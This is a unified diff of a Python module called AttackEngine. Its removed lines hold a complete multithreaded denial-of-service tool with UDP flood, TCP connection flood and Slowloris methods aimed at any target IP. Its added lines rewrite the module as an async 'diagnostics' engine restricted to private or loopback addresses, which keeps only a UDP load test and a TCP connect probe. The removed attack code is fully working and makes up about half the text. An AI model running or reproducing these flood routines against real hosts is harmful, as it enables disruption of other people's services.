@@ -1,156 +1,130 @@
-import socket
-import random
-import threading
-import time
-import logging
-from dataclasses import dataclass, field
-from typing import Dict, Optional
+"""Async network diagnostics engine.
 
-# Logging Setup
-logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
-logger = logging.getLogger("AttackEngine")
+This module intentionally enforces local/private targets only to prevent abuse.
+"""
+
+from __future__ import annotations
+
+import asyncio
+import os
+import socket
+import time
+from dataclasses import dataclass
+from typing import Optional
+
+from utils import is_private_or_loopback
+
 
 @dataclass
 class AttackStats:
-    total_requests: int = 0
-    successful: int = 0
-    failed: int = 0
-    start_time: Optional[float] = None
-    threads_active: int = 0
-    is_running: bool = False
-    _lock: threading.Lock = field(default_factory=threading.Lock)
+    sent_packets: int = 0
+    failed_packets: int = 0
+    bytes_sent: int = 0
+    started_at: float = 0.0
+    running: bool = False
 
-    def reset(self):
-        with self._lock:
-            self.total_requests = 0
-            self.successful = 0
-            self.failed = 0
-            self.start_time = time.time()
-            self.is_running = True
+    @property
+    def elapsed(self) -> float:
+        if not self.running:
+            return 0.0
+        return max(0.001, time.time() - self.started_at)
 
-    def log_success(self):
-        with self._lock:
-            self.total_requests += 1
-            self.successful += 1
+    @property
+    def rps(self) -> float:
+        return self.sent_packets / self.elapsed
 
-    def log_failure(self):
-        with self._lock:
-            self.total_requests += 1
-            self.failed += 1
 
-    def decrement_threads(self):
-        with self._lock:
-            self.threads_active -= 1
+class BufferPool:
+    """Reusable payload buffers for low allocation overhead."""
+
+    def __init__(self, size: int = 1200, count: int = 512) -> None:
+        self._buffers = [os.urandom(size) for _ in range(count)]
+        self._idx = 0
+
+    def next(self) -> bytes:
+        payload = self._buffers[self._idx]
+        self._idx = (self._idx + 1) % len(self._buffers)
+        return payload
+
 
 class AttackEngine:
-    def __init__(self, max_requests: int, thread_count: int, timeout: int):
-        self.max_requests = max_requests
-        self.thread_count = thread_count
-        self.timeout = timeout
+    """High-concurrency diagnostics for user-owned systems."""
+
+    def __init__(self, max_threads: int, max_duration: int) -> None:
+        self.max_threads = max_threads
+        self.max_duration = max_duration
         self.stats = AttackStats()
-        self._stop_event = threading.Event()
+        self._stop_event = asyncio.Event()
+        self._workers: list[asyncio.Task] = []
+        self._buffer_pool = BufferPool()
 
-    def _should_stop(self) -> bool:
-        # Check if stop requested or limits reached
-        if self._stop_event.is_set():
-            return True
-        if self.stats.total_requests >= self.max_requests:
-            return True
-        if self.stats.start_time and (time.time() - self.stats.start_time) >= self.timeout:
-            return True
-        return False
+    def stop(self) -> None:
+        self._stop_event.set()
 
-    def udp_flood(self, target_ip: str, target_port: int):
-        # Fix: Larger payload for realistic stress testing
-        payload = random._urandom(packet_size := 1400) 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        
+    async def run_udp_test(self, ip: str, port: int, duration: int) -> AttackStats:
+        if not is_private_or_loopback(ip):
+            raise ValueError("Safety block: diagnostics are allowed only for local/private targets")
+
+        run_seconds = min(duration, self.max_duration)
+        worker_count = self.max_threads
+
+        self.stats = AttackStats(started_at=time.time(), running=True)
+        self._stop_event.clear()
+
+        loop = asyncio.get_running_loop()
+        for _ in range(worker_count):
+            task = asyncio.create_task(self._udp_worker(loop, ip, port))
+            self._workers.append(task)
+
         try:
-            while not self._should_stop():
-                try:
-                    sock.sendto(payload, (target_ip, target_port))
-                    self.stats.log_success()
-                except socket.error:
-                    self.stats.log_failure()
+            await asyncio.wait_for(self._stop_event.wait(), timeout=run_seconds)
+        except asyncio.TimeoutError:
+            pass
+        finally:
+            self._stop_event.set()
+            await asyncio.gather(*self._workers, return_exceptions=True)
+            self._workers.clear()
+            self.stats.running = False
+
+        return self.stats
+
+    async def _udp_worker(self, loop: asyncio.AbstractEventLoop, ip: str, port: int) -> None:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setblocking(False)
+
+        try:
+            while not self._stop_event.is_set():
+                payload = self._buffer_pool.next()
+                ok = await loop.run_in_executor(None, self._sendto, sock, payload, ip, port)
+                if ok:
+                    self.stats.sent_packets += 1
+                    self.stats.bytes_sent += len(payload)
+                else:
+                    self.stats.failed_packets += 1
         finally:
             sock.close()
-            self.stats.decrement_threads()
 
-    def tcp_flood(self, target_ip: str, target_port: int):
-        while not self._should_stop():
-            try:
-                # Fix: Timeout parameter added to prevent hanging threads
-                with socket.create_connection((target_ip, target_port), timeout=self.timeout) as s:
-                    s.sendall(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
-                    self.stats.log_success()
-            except (socket.error, TimeoutError):
-                self.stats.log_failure()
-        self.stats.decrement_threads()
-
-    def slowloris(self, target_ip: str, target_port: int):
-        sockets = []
+    @staticmethod
+    def _sendto(sock: socket.socket, payload: bytes, ip: str, port: int) -> bool:
         try:
-            # Fix: Added better socket management for Slowloris
-            while not self._should_stop() and len(sockets) < 100:
-                try:
-                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    s.settimeout(5)
-                    s.connect((target_ip, target_port))
-                    s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
-                    s.send("User-Agent: StressTester/1.0\r\n".encode())
-                    sockets.append(s)
-                    self.stats.log_success()
-                except socket.error:
-                    self.stats.log_failure()
-                    break
-
-            while not self._should_stop():
-                for s in list(sockets):
-                    try:
-                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
-                    except socket.error:
-                        sockets.remove(s)
-                time.sleep(15) # Keep-alive interval
-        finally:
-            for s in sockets:
-                try: s.close()
-                except: pass
-            self.stats.decrement_threads()
-
-    def start_attack(self, target_ip: str, target_port: int, method: str = "udp"):
-        if self.stats.is_running:
+            sock.sendto(payload, (ip, port))
+            return True
+        except OSError:
             return False
 
-        self.stats.reset()
-        self._stop_event.clear()
-        self.stats.threads_active = self.thread_count
+    async def run_tcp_probe(self, ip: str, port: int, attempts: int = 25) -> dict:
+        if not is_private_or_loopback(ip):
+            raise ValueError("Safety block: TCP probe is allowed only for local/private targets")
 
-        methods = {
-            "udp": self.udp_flood,
-            "tcp": self.tcp_flood,
-            "slowloris": self.slowloris
-        }
-        
-        target_func = methods.get(method.lower(), self.udp_flood)
-        logger.info(f"Starting {method.upper()} test on {target_ip}:{target_port}")
-        
-        for i in range(self.thread_count):
-            t = threading.Thread(target=target_func, args=(target_ip, target_port), daemon=True)
-            t.start()
-        return True
-
-    def stop_attack(self) -> Dict:
-        self._stop_event.set()
-        self.stats.is_running = False
-        
-        # Fix: Prevent division by zero
-        duration = time.time() - self.stats.start_time if self.stats.start_time else 0
-        rps = self.stats.total_requests / duration if duration > 0.001 else 0
-        
-        return {
-            'total': self.stats.total_requests,
-            'successful': self.stats.successful,
-            'failed': self.stats.failed,
-            'duration': round(duration, 2),
-            'rps': round(rps, 2)
-        }
+        success = 0
+        for _ in range(attempts):
+            sock: Optional[socket.socket] = None
+            try:
+                sock = socket.create_connection((ip, port), timeout=2)
+                success += 1
+            except OSError:
+                pass
+            finally:
+                if sock:
+                    sock.close()
+        return {"attempts": attempts, "success": success, "failed": attempts - success}
